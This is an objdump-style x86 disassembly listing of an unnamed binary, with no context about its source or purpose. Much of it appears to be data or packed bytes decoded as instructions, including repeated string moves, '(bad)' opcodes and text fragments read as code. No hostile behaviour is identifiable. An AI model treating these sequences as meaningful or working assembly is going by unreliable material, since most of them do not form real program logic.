  422491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422492:	sbb    DWORD PTR [ebp+ecx*4-0x7c5b645c],esp
  422499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42249a:	shl    DWORD PTR [edx],cl
  42249c:	shr    DWORD PTR [ecx+esi*8],1
  42249f:	or     al,0xf7
  4224a1:	push   cs
  4224a2:	pop    ss
  4224a3:	outs   dx,BYTE PTR ds:[esi]
  4224a4:	adc    eax,0x3a49168
  4224a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224aa:	fwait
  4224ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ac:	add    esp,DWORD PTR [ebx+edx*4-0x6a5b805c]
  4224b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224b4:	xor    eax,0x9ba48da4
  4224b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ba:	and    DWORD PTR [ebx+edx*8-0xef32efe],0x6c
  4224c2:	imul   DWORD PTR [esi+0x17]
  4224c5:	dec    esi
  4224c6:	adc    eax,0x37a49148
  4224cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224cc:	fwait
  4224cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ce:	jae    0x422474
  4224d0:	popf   
  4224d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d2:	sbb    DWORD PTR [ebp+edx*4-0x705bba5c],esp
  4224d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224da:	fwait
  4224db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224dc:	and    DWORD PTR [ebx+edx*8-0xe932e9e],0x4c
  4224e4:	test   DWORD PTR [esi+0x16],0x91a814ae
  4224eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ec:	aaa    
  4224ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224ee:	fwait
  4224ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f0:	jae    0x422496
  4224f2:	popf   
  4224f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f4:	pop    ss
  4224f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f6:	xchg   ebp,eax
  4224f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f8:	push   ecx
  4224f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224fa:	mov    DWORD PTR [ebx+ebx*4-0x2c5b725c],esp
  422501:	inc    edx
  422502:	ror    DWORD PTR [eax+esi*8-0x54],1
  422506:	imul   BYTE PTR [esi-0x77eb71ea]
  42250c:	xchg   ecx,eax
  42250d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42250e:	aaa    
  42250f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422510:	fwait
  422511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422512:	jae    0x4224b8
  422514:	popf   
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	cmp    esp,DWORD PTR [ebp+edx*4-0x705b8c5c]
  42251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251e:	fwait
  42251f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422520:	xchg   DWORD PTR [edx+edx*8-0xf532f5e],esp
  422527:	mov    esi,?
  422529:	mov    ss,WORD PTR [esi]
  42252b:	out    dx,al
  42252c:	adc    al,0xe8
  42252e:	xchg   ecx,eax
  42252f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422530:	aaa    
  422531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422532:	fwait
  422533:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422534:	jae    0x4224da
  422536:	popf   
  422537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422538:	cmp    DWORD PTR [ebp+edx*4-0x705b805c],esp
  42253f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422540:	fwait
  422541:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422542:	and    DWORD PTR [edx+edx*8-0xf732f7e],0xffffffec
  42254a:	imul   dh
  42254c:	push   ss
  42254d:	into   
  42254e:	adc    al,0xc8
  422550:	xchg   ecx,eax
  422551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422552:	cmp    eax,0x51a49ba4
  422557:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422558:	popf   
  422559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42255a:	jnp    0x422500
  42255c:	xchg   ebx,eax
  42255d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42255e:	fwait
  42255f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422560:	xchg   ecx,eax
  422561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422562:	shl    dl,cl
  422564:	shr    ah,1
  422566:	lock int3 
  422568:	test   dh,0x16
  42256b:	cs adc al,0x28
  42256e:	push   ss
  42256f:	push   cs
  422570:	adc    al,0x8
  422572:	xchg   ebx,eax
  422573:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422574:	adc    DWORD PTR [ebx+ebx*4-0x605bb65c],esp
  42257b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42257c:	cmp    esp,DWORD PTR [ebx+edx*4-0x765b825c]
  422583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422584:	fwait
  422585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422586:	lea    esp,[edx+edx*8-0xfd32fde]
  42258d:	or     al,0xf6
  42258f:	push   cs
  422590:	push   ss
  422591:	outs   dx,BYTE PTR ds:[esi]
  422592:	adc    al,0x68
  422594:	xchg   ecx,eax
  422595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422596:	add    BYTE PTR [eax],al
  422598:	and    BYTE PTR [edx+eax*2],ah
  42259b:	add    BYTE PTR [esi+eiz*1],ch
  42259e:	inc    edx
  42259f:	add    BYTE PTR [esi+eiz*1],dh
  4225a2:	inc    edx
  4225a3:	add    BYTE PTR [edi+eiz*1+0x24180042],bh
  4225aa:	inc    edx
  4225ab:	add    BYTE PTR [eax],bh
  4225ad:	es inc edx
  4225af:	add    BYTE PTR [edx+0x1200427c],bl
  4225b5:	jg     0x4225f9
  4225b7:	add    BYTE PTR [eax],ch
  4225b9:	daa    
  4225ba:	inc    edx
  4225bb:	add    BYTE PTR [edi+eiz*1+0x26140042],ch
  4225c2:	inc    edx
  4225c3:	add    BYTE PTR [eax],bl
  4225c5:	es inc edx
  4225c7:	add    BYTE PTR [eax+0x7c004227],ch
  4225cd:	es inc edx
  4225cf:	add    BYTE PTR [edx-0x35],cl
  4225d2:	push   es
  4225d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d4:	scas   al,BYTE PTR es:[edi]
  4225d5:	or     al,0x6
  4225d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d8:	xor    BYTE PTR [esi],ah
  4225da:	inc    edx
  4225db:	add    al,ah
  4225dd:	es inc edx
  4225df:	add    ah,dh
  4225e1:	es inc edx
  4225e3:	add    BYTE PTR [eax],al
  4225e5:	daa    
  4225e6:	inc    edx
  4225e7:	add    BYTE PTR [eax],dl
  4225e9:	daa    
  4225ea:	inc    edx
  4225eb:	add    BYTE PTR [eax+0x26],ch
  4225ee:	inc    edx
  4225ef:	add    BYTE PTR [esp],bl
  4225f2:	inc    edx
  4225f3:	add    BYTE PTR [eax+0x78004226],cl
  4225f9:	es inc edx
  4225fb:	add    al,al
  4225fd:	daa    
  4225fe:	inc    edx
  4225ff:	add    BYTE PTR [esi+0x38a4069a],ch
  422605:	inc    ebx
  422606:	out    0xbd,eax
  422608:	cwde   
  422609:	es inc edx
  42260b:	add    BYTE PTR [eax+0x3c004226],ah
  422611:	es inc edx
  422613:	add    BYTE PTR [edi+eax*4],ah
  422616:	loopne 0x4225d5
  422618:	jbe    0x422695
  42261a:	pop    ds
  42261b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42261c:	add    BYTE PTR [eax],al
  42261e:	inc    eax
  42261f:	add    dl,ch
  422621:	rcl    dl,cl
  422623:	pop    ecx
  422624:	movq   QWORD PTR [edx+0x0],mm0
  422628:	(bad)  [edi+ebp*2+0x63]
  42262c:	ja     0x42263d
  42262e:	pop    ebx
  42262f:	xor    DWORD PTR [esi-0x5],esi
  422632:	(bad)  
  422633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422634:	mov    dl,0xc
  422636:	xchg   ebx,eax
  422637:	test   al,0x24
  422639:	es inc edx
  42263b:	add    BYTE PTR [edx-0x555bf926],ch
  422641:	fiadd  WORD PTR [esi]
  422643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422645:	fiadd  DWORD PTR [esi]
  422647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422648:	mov    ds:0xbea406da,al
  42264d:	fiadd  DWORD PTR [esi]
  42264f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422650:	mov    edx,0xb6a406da
  422655:	fiadd  DWORD PTR [esi]
  422657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422658:	mov    dl,0xda
  42265a:	push   es
  42265b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42265c:	mov    ds,edx
  42265e:	push   es
  42265f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422660:	mov    bl,dl
  422662:	push   es
  422663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422664:	out    dx,al
  422665:	fiadd  DWORD PTR [esi]
  422667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422668:	dec    DWORD PTR [ebx]
  42266a:	adc    edi,DWORD PTR [edx]
  42266c:	adc    al,0x24
  42266e:	inc    edx
  42266f:	add    BYTE PTR ds:0x17004229,al
  422675:	loop   0x422600
  422677:	js     0x422627
  422679:	call   0xa4d7:0xcb3aa406
  422680:	and    al,0x75
  422682:	add    BYTE PTR [eax],al
  422684:	adc    BYTE PTR [edx+eax*2],ah
  422687:	add    BYTE PTR [edx],ah
  422689:	inc    ebx
  42268a:	sbb    eax,DWORD PTR [edx+0x0]
	...
  422698:	hlt    
  422699:	clc    
  42269a:	sar    BYTE PTR [ebp+0x319340bf],cl
  4226a0:	sub    eax,DWORD PTR [edi+0x1f]
  4226a3:	jle    0x4226a5
	...
  4226c9:	add    BYTE PTR [eax],al
  4226cb:	add    BYTE PTR [edx+0x427c],bl
	...
  4226d9:	add    BYTE PTR [eax],al
  4226db:	add    cl,bh
  4226dd:	jmp    0xa48f2723
  4226e2:	push   ecx
  4226e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e4:	jg     0x42268a
  4226e6:	inc    edi
  4226e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e8:	push   ecx
  4226e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ea:	inc    ebx
  4226eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ec:	std    
  4226ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226ee:	jmp    DWORD PTR [ebx+ebx*4+0x550000a4]
  4226f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f6:	push   ebx
  4226f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226f8:	dec    ecx
  4226f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226fa:	std    
  4226fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226fc:	jmp    DWORD PTR [ebx+ebx*4+0x7da471a4]
  422703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422704:	push   ecx
  422705:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422706:	jg     0x4226ac
  422708:	std    
  422709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42270a:	jmp    DWORD PTR [ebx+ebx*4+0x7d0000a4]
  422711:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422712:	dec    ebx
  422713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422714:	inc    ebx
  422715:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422716:	jne    0x4226bc
  422718:	pop    ecx
  422719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271a:	jnp    0x4226c0
  42271c:	dec    ecx
  42271d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42271e:	fwait
  42271f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  422728:	xor    eax,eax
  42272a:	xor    esp,DWORD PTR [eax]
  42272c:	xor    eax,DWORD PTR [eax]
  42272e:	xor    esp,DWORD PTR [eax+0x33]
  422731:	inc    eax
  422732:	xor    ah,BYTE PTR [eax-0x1fcd7fce]
  422738:	xor    al,al
  42273a:	xor    ah,BYTE PTR [eax]
  42273c:	xor    al,BYTE PTR [eax]
  42273e:	xor    ah,BYTE PTR [eax+0x32]
  422741:	inc    eax
  422742:	xor    eax,DWORD PTR [eax-0x3dcc1fcd]
  422748:	xor    ecx,esp
  42274a:	xor    ecx,esi
  42274c:	xor    ecx,eax
  42274e:	xor    ecx,edx
  422750:	xor    edx,esp
  422752:	xor    edx,esi
  422754:	xor    edx,eax
  422756:	xor    edx,edx
  422758:	xor    ebx,esp
  42275a:	xor    ebx,esi
  42275c:	xor    ebx,eax
  42275e:	xor    ebx,edx
  422760:	xor    eax,esi
  422762:	push   ebx
  422763:	shl    BYTE PTR [ebx-0x40],0x93
  422767:	rcl    DWORD PTR [esi-0x56],0x15
  42276b:	into   
  42276c:	xchg   ebp,eax
  42276d:	dec    ecx
  42276e:	xor    ecx,esp
  422770:	sbb    eax,0x50abaae2
  422775:	push   0x1e
  422777:	cs je  0x42278e
  42277a:	mov    DWORD PTR [ebx+0x546ad794],ecx
  422780:	imul   edi,edx,0xffffffd5
  422783:	leave  
  422784:	daa    
  422785:	dec    eax
  422786:	out    dx,eax
  422787:	pushf  
  422788:	mov    dh,0xdf
  42278a:	dec    esi
  42278b:	xchg   ebp,eax
  42278c:	lock xor DWORD PTR [esi-0x6c],ebp
  422790:	inc    ebp
  422791:	or     eax,0xc1470876
  422796:	js     0x422753
  422798:	popa   
  422799:	pop    ecx
  42279a:	jecxz  0x422807
  42279c:	mov    BYTE PTR [edx-0x56],0x5
  4227a0:	cs enter 0xaa46,0x44
  4227a5:	aas    
  4227a6:	inc    ebp
  4227a7:	leave  
  4227a8:	test   BYTE PTR [ebx+0x819a593],0xd8
  4227af:	jl     0x422759
  4227b1:	mov    es,WORD PTR [edx+0x0]
  4227b4:	jb     0x422810
  4227b6:	pop    ss
  4227b7:	sub    ebx,DWORD PTR [esi+eiz*1]
  4227ba:	inc    edx
  4227bb:	add    BYTE PTR [eax+0x76004226],al
  4227c1:	sti    
  4227c2:	fbld   TBYTE PTR [ebp+0x0]
	...
  4227d0:	adc    edi,DWORD PTR [edx+0x6f6bd319]
  4227d6:	popa   
  4227d7:	arpl   WORD PTR [edi+0x7a],bp
  4227da:	popa   
  4227db:	outs   dx,DWORD PTR ds:[si]
  4227dd:	gs ins DWORD PTR es:[edi],dx
  4227df:	jae    0x422823
  4227e1:	outs   dx,DWORD PTR ds:[esi]
  4227e2:	ins    BYTE PTR es:[edi],dx
  4227e3:	gs mov cl,0x65
  4227e6:	in     eax,dx
  4227e7:	jg     0x422822
  4227e9:	ja     0x422854
  4227eb:	jp     0x4227e0
  4227ed:	inc    esp
  4227ee:	push   0x1b
  4227f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f1:	push   ecx
  4227f2:	dec    esp
  4227f3:	gs jb  0x42286f
  4227f6:	popa   
  4227f7:	push   ebx
  4227f8:	jne    0x42286b
  4227fa:	jae    0x42285d
  4227fc:	imul   esi,DWORD PTR [edx+0x6f],0x91565070
  422803:	inc    esp
  422804:	(bad)  [edx+0x65]
  422807:	jae    0x42285f
  422809:	imul   esi,DWORD PTR [ebx+0x61],0x616c6974
  422810:	jb     0x422874
  422812:	gs je  0x4227e8
  422815:	lds    edx,FWORD PTR [eax-0x68]
  422818:	xor    dl,BYTE PTR [eax+ecx*1+0x1d]
  42281c:	fs jne 0x42288e
  42281f:	push   eax
  422820:	gs fs jae 0x422891
  422824:	popa   
  422825:	ins    DWORD PTR es:[edi],dx
  422826:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  422839:	add    BYTE PTR [eax],al
  42283b:	add    BYTE PTR [esp+ecx*4],ch
  42283e:	push   ss
  42283f:	mov    esi,0x6f4c8773
  422844:	jb     0x4228b4
  422846:	jno    0x4228b1
  422848:	or     al,0x36
  42284a:	lods   al,BYTE PTR ds:[esi]
  42284b:	repnz push edx
  42284d:	je     0x4228be
  42284f:	je     0x422895
  422851:	js     0x42280f
  422853:	cmc    
  422854:	outs   dx,DWORD PTR ds:[esi]
  422855:	ins    DWORD PTR es:[edi],dx
  422856:	popa   
  422857:	imul   esp,DWORD PTR [eax-0x77],0x67411cbf
  42285e:	popa   
  42285f:	jb     0x4228d6
  422861:	push   0x68736f79
  422866:	imul   ebp,DWORD PTR [esi+0x74],0x1d006261
  42286d:	mov    ch,0xa5
  42286f:	jns    0x4228e4
  422871:	outs   dx,DWORD PTR ds:[esi]
  422872:	addr16 popa 
  422874:	add    BYTE PTR [bp+si],bh
  422877:	sub    bh,cl
  422879:	icebp  
  42287a:	gs ins BYTE PTR es:[edi],dx
  42287c:	jae    0x4228c6
  42287e:	popa   
  42287f:	je     0x4228e9
  422881:	ins    DWORD PTR es:[edi],dx
  422882:	add    BYTE PTR gs:[bx+si],al
  422886:	in     al,dx
  422887:	mov    ecx,0x414ad1d2
  42288c:	ins    DWORD PTR es:[edi],dx
  42288d:	imul   esi,DWORD PTR [ebx+0x4b],0x676c686f
  422894:	gs ins DWORD PTR es:[edi],dx
  422896:	add    BYTE PTR [eax],al
  422898:	jne    0x4228aa
  42289a:	popa   
  42289b:	or     BYTE PTR [esi+0x73654dbb],al
  4228a1:	popa   
  4228a2:	push   0x78000061
  4228a7:	loope  0x4228eb
  4228a9:	stos   BYTE PTR es:[edi],al
  4228aa:	je     0x42290d
  4228ac:	push   edi
  4228ad:	popa   
  4228ae:	jb     0x42291b
  4228b0:	jae    0x42291d
  4228b2:	imul   esi,DWORD PTR [edx+0x68],0x4100006f
  4228b9:	loope  0x422887
  4228bb:	aad    0x6f
  4228bd:	jb     0x42292b
  4228bf:	imul   ebp,DWORD PTR [ebp+0x69],0x8b060000
  4228c6:	je     0x4228db
  4228c8:	adc    al,BYTE PTR [ebp+0x77646172]
  4228ce:	outs   dx,DWORD PTR ds:[esi]
  4228cf:	gs ins DWORD PTR es:[edi],dx
  4228d1:	imul   edi,DWORD PTR [eax+0x66],0x65706769
  4228d8:	outs   dx,BYTE PTR ds:[esi]
  4228d9:	shr    DWORD PTR fs:[ebx+0x61018e3a],cl
  4228e0:	ja     0x422946
  4228e2:	outs   dx,DWORD PTR ds:[esi]
  4228e3:	popa   
  4228e4:	outs   dx,BYTE PTR ds:[esi]
  4228e5:	gs jae 0x42294a
  4228e8:	imul   ebp,DWORD PTR [edi+0x72],0x75536465
  4228ef:	imul   esi,DWORD PTR [edi+edx*2+0x6f],0x2dea6576
  4228f7:	inc    ebx
  4228f8:	jb     0x4228b3
  4228fa:	sbb    al,0xd9
  4228fc:	jo     0x422967
  4228fe:	addr16 js 0x422976
  422901:	jo     0x422978
  422903:	fs add ch,cl
  422906:	xchg   esi,eax
  422907:	in     eax,dx
  422908:	jno    0x42297b
  42290a:	iret   
  42290b:	jbe    0x422906
  42290d:	or     dh,BYTE PTR [esi-0x3]
  422910:	cwde   
  422911:	int    0xd6
  422913:	std    
  422914:	pop    ebp
  422915:	fsubr  DWORD PTR [edi]
  422917:	dec    edx
  422918:	xor    eax,0xd6cd860a
  42291d:	stc    
  42291e:	inc    ebx
  42291f:	adc    DWORD PTR [eax+0x6e7988d6],ebp
  422925:	dec    edx
  422926:	sbb    BYTE PTR [ecx+0x52],bh
  422929:	mov    ch,al
  42292b:	jns    0x42297f
  42292d:	dec    edx
  42292e:	sbb    BYTE PTR [ecx+0x6e],bh
  422931:	xchg   edx,eax
  422932:	cmp    eax,0xcd96c5cb
  422937:	in     eax,dx
  422938:	jno    0x4229ab
  42293a:	iret   
  42293b:	jbe    0x422936
  42293d:	or     dh,BYTE PTR [esi-0x3]
  422940:	int    0x96
  422942:	std    
  422943:	pop    ebp
  422944:	jns    0x422991
  422946:	pop    edx
  422947:	xor    eax,0x96cd920a
  42294c:	stc    
  42294d:	inc    ebx
  42294e:	icebp  
  42294f:	(bad)  
  422950:	das    
  422951:	int    0x76
  422953:	mov    BYTE PTR [ecx+0x6e],bh
  422956:	mov    DWORD PTR [edx-0x13749387],esi
  42295c:	jns    0x4229cc
  42295e:	xchg   BYTE PTR [edi-0x3d789187],ah
  422964:	retf   
  422965:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42296c:	jno    0x42293d
  42296e:	jbe    0x422969
  422970:	or     dh,BYTE PTR [esi-0x3]
  422973:	int    0x96
  422975:	std    
  422976:	pop    ebp
  422977:	fdiv   DWORD PTR [ebx-0x6df55465]
  42297d:	int    0x96
  42297f:	stc    
  422980:	inc    ebx
  422981:	icebp  
  422982:	(bad)  
  422983:	test   BYTE PTR [ecx+0x6e],bh
  422986:	mov    ebp,esp
  422988:	int    0x76
  42298a:	mov    BYTE PTR [ecx+0x6e],bh
  42298d:	add    DWORD PTR [edi+0x79],0xcbd2896c
  422994:	rol    BYTE PTR [eax+eax*4+0x71edcd96],cl
  42299b:	jno    0x42296c
  42299d:	jbe    0x422998
  42299f:	or     dh,BYTE PTR [esi-0x3]
  4229a2:	cwde   
  4229a3:	int    0xd6
  4229a5:	std    
  4229a6:	pop    ebp
  4229a7:	ret    0x2be4
  4229aa:	cmp    DWORD PTR [edx],ecx
  4229ac:	xchg   ch,cl
  4229ae:	(bad)  
  4229af:	stc    
  4229b0:	inc    ebx
  4229b1:	adc    DWORD PTR [eax+0x52794ad6],ebp
  4229b7:	test   BYTE PTR [ebx-0x78913648],ch
  4229bd:	ret    0x79ab
  4229c0:	xchg   edx,eax
  4229c1:	aad    0xcb
  4229c3:	lds    edx,FWORD PTR [esi+0x7171edcd]
  4229c9:	iret   
  4229ca:	jbe    0x4229c5
  4229cc:	or     dh,BYTE PTR [esi-0x3]
  4229cf:	int    0x96
  4229d1:	std    
  4229d2:	pop    ebp
  4229d3:	pop    ecx
  4229d4:	ins    BYTE PTR es:[edi],dx
  4229d5:	cmp    dh,BYTE PTR ds:0x96cd920a
  4229db:	stc    
  4229dc:	inc    ebx
  4229dd:	icebp  
  4229de:	(bad)  
  4229df:	push   ebx
  4229e0:	int    0x76
  4229e2:	mov    BYTE PTR [ecx+0x6e],bh
  4229e5:	mov    BYTE PTR [edi+0x47816c79],ah
  4229eb:	jns    0x422a5b
  4229ed:	test   DWORD PTR [ebx-0x7f7b2d35],esp
  4229f3:	call   0xcded:0xcd965b98
  4229fa:	jbe    0x422a30
  4229fc:	xor    DWORD PTR [esi+0x3c],0xd6cdfd70
  422a03:	sbb    al,0x81
  422a05:	(bad)  
  422a06:	and    al,0x98
  422a08:	int    0xd6
  422a0a:	adc    al,0x47
  422a0c:	mov    ds:0xff8eca62,al
  422a11:	add    al,0x7d
  422a13:	add    ch,dl
  422a15:	lods   eax,DWORD PTR ds:[esi]
  422a16:	clc    
  422a17:	icebp  
  422a18:	jo     0x4229e4
  422a1a:	(bad)  
  422a1c:	jge    0x422a1e
  422a1e:	aad    0xad
  422a20:	clc    
  422a21:	icebp  
  422a22:	jo     0x4229b6
  422a24:	adc    ecx,ebp
  422a26:	inc    DWORD PTR [ebp*8+0x6c6d334c]
  422a2d:	jo     0x422a9f
  422a2f:	jo     0x422aa1
  422a31:	jo     0x4229cd
  422a33:	xor    esi,edi
  422a35:	cwde   
  422a36:	add    al,0xc
  422a38:	add    BYTE PTR [ebp-0x80],bl
  422a3b:	xchg   DWORD PTR [eax-0x30522a80],eax
  422a41:	or     DWORD PTR [eax-0x75],ebx
  422a44:	add    BYTE PTR [eax-0x7f7b7fa3],0x84
  422a4b:	jecxz  0x422a38
  422a4d:	hlt    
  422a4e:	scas   eax,DWORD PTR es:[edi]
  422a4f:	rol    BYTE PTR [ebp-0x6def4262],0x80
  422a56:	sub    dl,0xfa
  422a59:	iret   
  422a5a:	pop    eax
  422a5b:	iret   
  422a5c:	push   0xffffffcd
  422a5e:	out    0xfd,al
  422a60:	int    0x76
  422a62:	adc    DWORD PTR [ebx],esi
  422a64:	out    0x34,al
  422a66:	sub    ecx,ecx
  422a68:	or     dh,BYTE PTR [esi-0x43]
  422a6b:	rol    BYTE PTR [eax-0x7f6d1243],1
  422a71:	sub    BYTE PTR [edi],0x6
  422a74:	sub    DWORD PTR [eax-0x72357f80],eax
  422a7a:	cmc    
  422a7b:	sub    esp,esi
  422a7d:	in     eax,dx
  422a7e:	aad    0xe9
  422a80:	add    ebx,ebp
  422a82:	mov    bh,dh
  422a84:	fcmovnbe st,st(5)
  422a86:	out    dx,eax
  422a87:	pushf  
  422a88:	xchg   edi,edi
  422a8a:	test   al,0xcf
  422a8c:	fs adc ebx,0xffffffe9
  422a90:	mov    BYTE PTR [ebx+ecx*4-0x60],ah
  422a94:	iret   
  422a95:	int3   
  422a96:	call   0x80c2795f
  422a9b:	jno    0x422a35
  422a9d:	imul   eax,DWORD PTR [eax+0x70808081],0x548281d0
  422aa7:	int    0xe6
  422aa9:	std    
  422aaa:	xor    esp,esi
  422aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422aad:	das    
  422aae:	pop    ecx
  422aaf:	push   0xffffffcd
  422ab1:	(bad)  
  422ab2:	or     eax,0xfcde9e3
  422ab7:	sub    edi,eax
  422ab9:	xchg   DWORD PTR [edi],ecx
  422abb:	iret   
  422abc:	les    ecx,FWORD PTR [ebp-0x6da04280]
  422ac2:	add    BYTE PTR [eax-0x102c8233],0x88
  422ac9:	add    al,0xf2
  422acb:	add    DWORD PTR [ebx+0x2],0x80818069
  422ad2:	adc    dh,0x4e
  422ad5:	inc    ebx
  422ad6:	jns    0x422a5a
  422ad8:	fldlg2 
  422ada:	es int 0xc6
  422add:	or     eax,0x809221bd
  422ae2:	add    al,0x81
  422ae5:	mov    al,ds:0xfb87d287
  422aea:	add    al,0xbd
  422aec:	add    DWORD PTR [edi+ebp*8],0x436dcd81
  422af3:	jns    0x422ac2
  422af5:	ins    DWORD PTR es:[edi],dx
  422af6:	and    ch,0xa0
  422af9:	push   edx
  422afa:	add    al,0x3
  422afc:	test   DWORD PTR [edx+0x2f8213cd],ecx
  422b02:	push   edx
  422b03:	add    al,0x3
  422b05:	push   ebx
  422b06:	mov    al,cl
  422b08:	test   bh,bh
  422b0a:	retf   
  422b0b:	add    BYTE PTR [ecx+eax*8+0x33cbff8b],0xe3
  422b13:	(bad)  
  422b14:	in     al,dx
  422b15:	outs   dx,DWORD PTR ds:[esi]
  422b16:	rcl    bl,1
  422b18:	(bad)  
  422b19:	jge    0x422ad8
  422b1b:	outs   dx,DWORD PTR ds:[esi]
  422b1c:	xchg   edx,eax
  422b1d:	add    BYTE PTR [eax-0x5563eb2a],0xa0
  422b24:	sahf   
  422b25:	mov    al,ds:0x3454009e
  422b2a:	jno    0x422b8e
  422b2c:	popa   
  422b2d:	mov    ah,0x86
  422b2f:	add    BYTE PTR [eax+0x77ec80c1],0xd0
  422b36:	push   cs
  422b37:	(bad)  
  422b38:	jge    0x422af7
  422b3a:	push   eax
  422b3b:	xchg   edx,eax
  422b3c:	add    BYTE PTR [eax+0x2d048d6],0xff
  422b43:	jge    0x422b02
  422b45:	push   ss
  422b46:	xchg   edx,eax
  422b47:	add    BYTE PTR [eax+0x649c5bd6],0x8b
  422b4e:	ror    BYTE PTR [ecx+0x53d09282],1
  422b54:	jo     0x422b23
  422b56:	(bad)  
  422b57:	std    
  422b58:	xor    edx,esi
  422b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b5b:	inc    ebx
  422b5c:	(bad)  
  422b5d:	xor    al,0x2f
  422b5f:	or     esp,ebx
  422b61:	add    DWORD PTR [eax-0x1932ba80],0xceeb41fd
  422b6b:	add    DWORD PTR [eax-0x42622f80],0x808081fa
  422b75:	int    0xd6
  422b77:	popf   
  422b78:	aam    0x23
  422b7a:	shl    BYTE PTR [ebp-0x7f7e1143],1
  422b80:	or     ch,0xd6
  422b83:	xchg   ebp,eax
  422b84:	aam    0x89
  422b86:	int    0xd6
  422b88:	icebp  
  422b89:	int    0x8d
  422b8b:	xchg   ebp,eax
  422b8c:	or     cl,BYTE PTR [ebp-0x6272320f]
  422b92:	or     cl,BYTE PTR [ebp-0x5a72326b]
  422b98:	or     cl,BYTE PTR [ebp-0x5a29f563]
  422b9e:	pushf  
  422b9f:	stos   BYTE PTR es:[edi],al
  422ba0:	sahf   
  422ba1:	popa   
  422ba2:	mov    esp,0xc180804a
  422ba7:	mov    BYTE PTR [edi+0x649a62d9],al
  422bad:	mov    ecx,edx
  422baf:	rol    DWORD PTR [edx+0x70878492],cl
  422bb5:	int    0xc6
